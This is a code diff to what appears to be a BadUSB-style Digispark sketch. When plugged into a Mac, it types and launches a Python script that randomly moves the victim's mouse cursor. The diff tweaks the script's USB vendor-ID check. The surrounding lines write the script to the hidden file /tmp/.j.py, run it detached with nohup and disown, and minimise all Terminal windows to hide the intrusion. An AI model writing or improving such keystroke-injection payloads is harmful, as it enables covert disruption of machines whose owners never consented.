@@ -21,7 +21,7 @@ void setup() {
   pln(PSTR("from Quartz import CGWarpMouseCursorPosition"));
   pln(PSTR("def p():"));
   pln(PSTR(" r=subprocess.run(['hidutil','list'],capture_output=1,text=1,timeout=2)"));
-  pln(PSTR(" return '0x16C0' in r.stdout"));
+  pln(PSTR(" return '16c0' in r.stdout.lower()"));
   pln(PSTR("while 1:"));
   pln(PSTR(" time.sleep(3 if p() else 120)"));
   pln(PSTR(" CGWarpMouseCursorPosition((random.randint(0,2560),random.randint(0,1600)))"));
@@ -30,3 +30,4 @@ void setup() {
   pln(PSTR("python3 -m pip install pyobjc-framework-Quartz -q;nohup python3 /tmp/.j.py&disown;osascript -e 'tell app \"Terminal\" to set miniaturized of every window to true'"));
 }
 void loop(){DigiKeyboard.delay(1);}
+
